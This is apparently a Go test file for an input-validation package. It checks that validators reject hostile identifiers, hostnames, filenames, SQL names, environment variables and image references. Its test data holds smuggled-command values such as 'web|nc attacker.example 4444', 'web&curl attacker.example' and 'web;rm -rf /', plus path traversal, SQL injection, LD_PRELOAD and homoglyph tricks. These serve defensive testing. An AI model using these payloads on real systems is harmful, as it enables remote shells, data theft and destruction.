package guard

import "testing"

// hostileIdentifiers are inputs that must never be accepted as an internal
// identifier. Each one is a real injection, traversal, or normalization
// trick rather than a merely malformed string.
var hostileIdentifiers = []struct {
	name  string
	value string
}{
	{"command substitution", "web$(id)"},
	{"backtick substitution", "web`id`"},
	{"semicolon chain", "web;rm -rf /"},
	{"pipe chain", "web|nc attacker.example 4444"},
	{"ampersand background", "web&curl attacker.example"},
	{"newline injection", "web\nrm -rf /"},
	{"carriage return injection", "web\rrm"},
	{"null byte truncation", "web\x00.evil"},
	{"traversal", "../etc"},
	{"absolute path", "/etc/shadow"},
	{"glob", "web*"},
	{"redirect", "web>out"},
	{"quote break", "web'or'1"},
	{"double quote break", "web\"or\"1"},
	{"leading hyphen option", "-rf"},
	{"trailing hyphen", "web-"},
	{"consecutive separators", "web--app"},
	{"uppercase", "Web"},
	{"space", "web app"},
	{"tab", "web\tapp"},
	{"cyrillic homoglyph", "wеb"},
	{"fullwidth digits", "ｗeb"},
	{"zero width joiner", "we​b"},
	{"combining mark", "web́"},
	{"empty", ""},
}

func TestValidateIdentifierRejectsHostileInput(t *testing.T) {
	for _, tc := range hostileIdentifiers {
		t.Run(tc.name, func(t *testing.T) {
			if err := ValidateIdentifier("test", tc.value); err == nil {
				t.Fatalf("ValidateIdentifier accepted hostile value %q", tc.value)
			} else if !IsDenied(err) {
				t.Fatalf("ValidateIdentifier returned a non-guard error: %v", err)
			}
		})
	}
}

func TestValidateIdentifierAcceptsWellFormed(t *testing.T) {
	for _, value := range []string{"web", "web-app", "web_app", "t1", "a1b2c3"} {
		if err := ValidateIdentifier("test", value); err != nil {
			t.Fatalf("ValidateIdentifier rejected %q: %v", value, err)
		}
	}
}

func TestValidateIdentifierRejectsOverlongValue(t *testing.T) {
	long := make([]byte, MaxIdentifierLen+1)
	for i := range long {
		long[i] = 'a'
	}
	if err := ValidateIdentifier("test", string(long)); err == nil {
		t.Fatal("ValidateIdentifier accepted an overlong value")
	}
}

func TestValidateUsernameRejectsShortAndHostile(t *testing.T) {
	for _, value := range []string{"", "ab", "-abc", "abc-", "ab..c", "root\x00", "admin;drop"} {
		if err := ValidateUsername(value); err == nil {
			t.Fatalf("ValidateUsername accepted %q", value)
		}
	}
	if err := ValidateUsername("tenant-one"); err != nil {
		t.Fatalf("ValidateUsername rejected a valid name: %v", err)
	}
}

func TestValidateHostnameRejectsHostileInput(t *testing.T) {
	for _, value := range []string{
		"",
		"exa mple.com",
		"example..com",
		"-example.com",
		"example-.com",
		"example.com/../etc",
		"example.com\x00.evil.com",
		"example.com;id",
		"еxample.com",
		"example.com\nHost: evil",
	} {
		if err := ValidateHostname(value); err == nil {
			t.Fatalf("ValidateHostname accepted %q", value)
		}
	}
	for _, value := range []string{"example.com", "a.b.c.example.com", "host", "example.com."} {
		if err := ValidateHostname(value); err != nil {
			t.Fatalf("ValidateHostname rejected %q: %v", value, err)
		}
	}
}

func TestValidateDomainNameRejectsOverlayAndReservedNames(t *testing.T) {
	for _, value := range []string{
		"deadbeef.onion",
		"site.i2p",
		"printer.local",
		"api.internal",
		"box.localhost",
		"thing.test",
		"nothing.invalid",
		"demo.example",
		"host",
		"1.2.3.4",
	} {
		if err := ValidateDomainName(value); err == nil {
			t.Fatalf("ValidateDomainName accepted %q", value)
		}
	}
	if err := ValidateDomainName("tenant.example.org"); err != nil {
		t.Fatalf("ValidateDomainName rejected a real domain: %v", err)
	}
}

func TestValidateFQDNRejectsBareAndNumericNames(t *testing.T) {
	for _, value := range []string{
		"",
		"host",
		"1.2.3.4",
		"*.example.com",
		"example.c",
		"example.123",
		"example.com;id",
	} {
		if err := ValidateFQDN(value); err == nil {
			t.Fatalf("ValidateFQDN accepted %q", value)
		}
	}
	for _, value := range []string{"example.com", "a.b.example.co.uk", "example.xn--p1ai"} {
		if err := ValidateFQDN(value); err != nil {
			t.Fatalf("ValidateFQDN rejected %q: %v", value, err)
		}
	}
}

func TestValidateFilenameRejectsTraversalAndReservedNames(t *testing.T) {
	for _, value := range []string{
		"../../etc/passwd",
		"..",
		"a/b",
		`a\b`,
		"file\x00.png",
		"file ",
		" file",
		"file.",
		"con",
		"CON.txt",
		"nul",
		"lpt1.log",
		"file;rm",
		"file`id`",
		"file$(id)",
		"..%2f..%2fetc",
		"f‮exe.txt",
	} {
		if err := ValidateFilename(value); err == nil {
			t.Fatalf("ValidateFilename accepted %q", value)
		}
	}
	if err := ValidateFilename("backup-2026-01-01.tar.gz"); err != nil {
		t.Fatalf("ValidateFilename rejected a normal name: %v", err)
	}
}

func TestValidateSQLIdentifierRejectsInjection(t *testing.T) {
	for _, value := range []string{
		"",
		"1col",
		"col;drop table users",
		"col--",
		"col/*x*/",
		`col" or "1"="1`,
		"col name",
		"col`",
		"users.id",
		"col\x00",
	} {
		if err := ValidateSQLIdentifier("column", value); err == nil {
			t.Fatalf("ValidateSQLIdentifier accepted %q", value)
		}
	}
	for _, value := range []string{"tenant_id", "_id", "Column1"} {
		if err := ValidateSQLIdentifier("column", value); err != nil {
			t.Fatalf("ValidateSQLIdentifier rejected %q: %v", value, err)
		}
	}
}

func TestValidateEnvVarNameRejectsLoaderVariables(t *testing.T) {
	for _, value := range []string{
		"LD_PRELOAD",
		"LD_LIBRARY_PATH",
		"LD_AUDIT",
		"PATH",
		"IFS",
		"BASH_ENV",
		"BASH_FUNC_x%%",
		"PYTHONPATH",
		"NODE_OPTIONS",
		"lowercase",
		"1START",
		"HAS-DASH",
		"HAS SPACE",
		"HAS=EQUALS",
		"",
	} {
		if err := ValidateEnvVarName(value); err == nil {
			t.Fatalf("ValidateEnvVarName accepted %q", value)
		}
	}
	if err := ValidateEnvVarName("APP_PORT"); err != nil {
		t.Fatalf("ValidateEnvVarName rejected a normal name: %v", err)
	}
}

func TestValidateEnvVarsRejectsWholeEnvironmentOnOneBadEntry(t *testing.T) {
	if _, err := ValidateEnvVars(map[string]string{"GOOD": "1", "LD_PRELOAD": "/tmp/x.so"}); err == nil {
		t.Fatal("ValidateEnvVars accepted an environment containing LD_PRELOAD")
	}
	if _, err := ValidateEnvVars(map[string]string{"GOOD": "line1\nline2"}); err == nil {
		t.Fatal("ValidateEnvVars accepted a value containing a newline")
	}
	out, err := ValidateEnvVars(map[string]string{"APP_ENV": "production"})
	if err != nil {
		t.Fatalf("ValidateEnvVars rejected a clean environment: %v", err)
	}
	if len(out) != 1 || out[0] != "APP_ENV=production" {
		t.Fatalf("ValidateEnvVars produced %v", out)
	}
}

func TestValidateExecArgRejectsControlBytes(t *testing.T) {
	for _, value := range []string{"a\x00b", "a\nb", "a\rb", "a\tb", "a\x1bb", "a\x7fb"} {
		if err := ValidateExecArg(value); err == nil {
			t.Fatalf("ValidateExecArg accepted %q", value)
		}
	}
	// Metacharacters are inert without a shell, so an argument body may
	// legitimately contain them.
	if err := ValidateExecArg("pass$word;with|meta"); err != nil {
		t.Fatalf("ValidateExecArg rejected an inert metacharacter body: %v", err)
	}
}

func TestValidateImageReferenceRejectsHostileInput(t *testing.T) {
	for _, value := range []string{
		"",
		"-oProxyCommand=id",
		"registry.example.com/../../etc/passwd",
		"image;id",
		"image$(id)",
		"image name",
		"image\x00",
		"imagé",
	} {
		if err := ValidateImageReference(value); err == nil {
			t.Fatalf("ValidateImageReference accepted %q", value)
		}
	}
	for _, value := range []string{
		"nginx:1.27-alpine",
		"registry.example.com/team/app:v1",
		"registry.example.com/team/app@sha256:" + "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
	} {
		if err := ValidateImageReference(value); err != nil {
			t.Fatalf("ValidateImageReference rejected %q: %v", value, err)
		}
	}
}
